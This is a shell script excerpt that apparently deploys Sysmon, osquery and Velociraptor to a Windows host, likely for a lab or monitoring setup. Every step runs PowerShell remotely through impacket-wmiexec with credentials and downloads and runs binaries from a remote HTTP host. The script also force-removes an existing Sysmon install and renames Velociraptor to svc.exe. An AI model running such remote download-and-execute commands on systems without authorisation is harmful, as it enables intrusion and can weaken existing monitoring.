...
if [ "$OS_TYPE" = "windows" ]; then
    ...
    run_deployment_step "Sysmon" 1 3 \
        ...
        "powershell -c \"mkdir C:\\ProgramData\\svc -Force | Out-Null; Invoke-WebRequest -Uri http://${VPN_IP}:8443/Sysmon64.exe -OutFile C:\\ProgramData\\svc\\Sysmon64.exe; Invoke-WebRequest -Uri http://${VPN_IP}:8443/sysmonconfig-excludes-only.xml -OutFile C:\\ProgramData\\svc\\sysmonconfig.xml; Start-Process -FilePath C:\\ProgramData\\svc\\Sysmon64.exe -ArgumentList '-u force' -Wait -ErrorAction SilentlyContinue; Start-Process -FilePath C:\\ProgramData\\svc\\Sysmon64.exe -ArgumentList '-accepteula -i C:\\ProgramData\\svc\\sysmonconfig.xml' -Wait; Get-Service Sysmon64 -ErrorAction SilentlyContinue | Select-Object Status,Name\""

    run_deployment_step "osquery" 2 3 \
        impacket-wmiexec "${CREDS}@${TARGET_IP}" \
        "powershell -c \"Invoke-WebRequest -Uri http://${VPN_IP}:8443/osquery.zip -OutFile C:\\ProgramData\\svc\\osquery.zip; Invoke-WebRequest -Uri http://${VPN_IP}:8443/osquery.conf -OutFile C:\\ProgramData\\svc\\osquery.conf; Invoke-WebRequest -Uri http://${VPN_IP}:8443/osquery.flags -OutFile C:\\ProgramData\\svc\\osquery.flags; Expand-Archive C:\\ProgramData\\svc\\osquery.zip C:\\ProgramData\\svc\\osquery_tmp -Force; \\\$dir = (Get-ChildItem C:\\ProgramData\\svc\\osquery_tmp -Directory | Select-Object -First 1).FullName; Copy-Item -Path (\\\$dir + '\\Program Files\\osquery') -Destination 'C:\\Program Files\\osquery' -Recurse -Force; Copy-Item C:\\ProgramData\\svc\\osquery.conf 'C:\\Program Files\\osquery\\osquery.conf' -Force; Copy-Item C:\\ProgramData\\svc\\osquery.flags 'C:\\Program Files\\osquery\\osquery.flags' -Force; New-Service -Name osqueryd -BinaryPathName 'C:\\Progra~1\\osquery\\osqueryd\\osqueryd.exe --flagfile=C:\\Progra~1\\osquery\\osquery.flags' -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service osqueryd; Get-Service osqueryd | Select-Object Status,Name\""

    run_deployment_step "Velociraptor" 3 3 \
        impacket-wmiexec "${CREDS}@${TARGET_IP}" \
        "powershell -c \"Stop-Service Velociraptor -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri http://${VPN_IP}:8443/velociraptor.exe -OutFile C:\\ProgramData\\svc\\svc.exe; Invoke-WebRequest -Uri http://${VPN_IP}:8443/client.config.yaml -OutFile C:\\ProgramData\\svc\\c.yaml; Start-Process -FilePath C:\\ProgramData\\svc\\svc.exe -ArgumentList 'service install --config C:\\ProgramData\\svc\\c.yaml' -Wait; Start-Service Velociraptor; Get-Service Velociraptor | Select-Object Status,Name\""
